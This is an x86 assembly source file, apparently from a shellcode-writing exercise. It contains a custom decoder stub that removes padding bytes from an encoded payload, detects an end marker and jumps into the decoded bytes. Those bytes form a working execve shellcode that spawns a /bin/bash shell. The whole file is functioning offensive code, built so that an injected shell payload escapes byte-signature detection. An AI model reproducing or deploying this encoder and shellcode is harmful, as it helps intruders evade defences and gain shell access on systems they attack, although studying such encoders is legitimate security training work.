; Filename: ExecEncodedShellcode.nasm
; Author: Jeremy Catelain

global _start

section .text
_start:

	jmp short calldecoder ; jump to the calldecoder section


decoder :
	xor esi, esi
	pop esi ; retrieve the address of the EncodedShellcode	

	; EDX, counter
	xor edx, edx
	mov dl, 0x1 ; Initialize the counter to 1

	; EBX, number of shift from ESI to point to the values to retrieve
	xor ebx, ebx ; ebx = 0x00
	
	; EDI, address where to write the values retrieved
	xor edi, edi
	mov edi, esi ; Initialize the address of edi at the address of esi

	; Initializatio of the registers 
	xor eax, eax
	xor ecx, ecx	

nextSetValues : 

	; Find where we want write the set of values
	lea edi, [edi + edx]

	; find the set of values that we want to write, 1st value of the set at 2*edx + ebx 
	mov al, 2 				; Intialize the value of eax to 2	
	mul dl					; Multiply with edx (2*edx)
	add eax, ebx
	mov ebx, eax				; mov into ebx = ebx + 2*edx
	xor ecx, ecx 				; Init the counter to zero

nextValues :	
	
	pusha					; Save registers state

	; Find the location where we want to write the value
	xor eax, eax
	lea eax, [edi + ecx]			; Value at EDI + ECX

	; Find the value that we want to retrieve 
	add ebx, ecx				; esi + ebx + ecx location of the value we want to retrieve from esi

	; check if the next 4 bytes are our egg
	cmp dword [esi + ebx], 0xbbbbbbbb ; Compare the next 4 bytes
	je EncodedShellcode			; If equal, the egg is found, jump to the shellcode

	; If the next value are not the egg, we continue and write into the memory location previously find	
	lea edx, [esi + ebx]		; lea edx, [esi + ebx + ecx]
	mov bl, byte [edx] 			; mov the value we want into bl
	mov byte [eax], bl 			; mov the value we temporary stored at bl into al
	
	popa					; Restore the registers
	
	; Go to the next value of the set of values
	inc ecx					; Increment the counter to go to the next value of the set
	cmp ecx, edx				; If the same value, no more value to move
	jle short nextValues			; If the counter is less or equal than the number of values
	
	inc edx					; Increment the counter
	jmp short nextSetValues			; Go to the next set of values to retrieve
	

calldecoder : 
	call decoder
	EncodedShellcode : db 0x31,0xaa,0xc0,0x50,0xaa,0xaa,0x68,0x62,0x61,0xaa,0xaa,0xaa,0x73,0x68,0x68,0x62,0xaa,0xaa,0xaa,0xaa,0x69,0x6e,0x2f,0x68,0x2f,0xaa,0xaa,0xaa,0xaa,0xaa,0x2f,0x2f,0x2f,0x89,0xe3,0x50,0xaa,0xaa,0xaa,0xaa,0xaa,0xaa,0x89,0xe2,0x53,0x89,0xe1,0xb0,0x0b,0xaa,0xaa,0xaa,0xaa,0xaa,0xaa,0xaa,0xcd,0x80,0xbb,0xbb,0xbb,0xbb
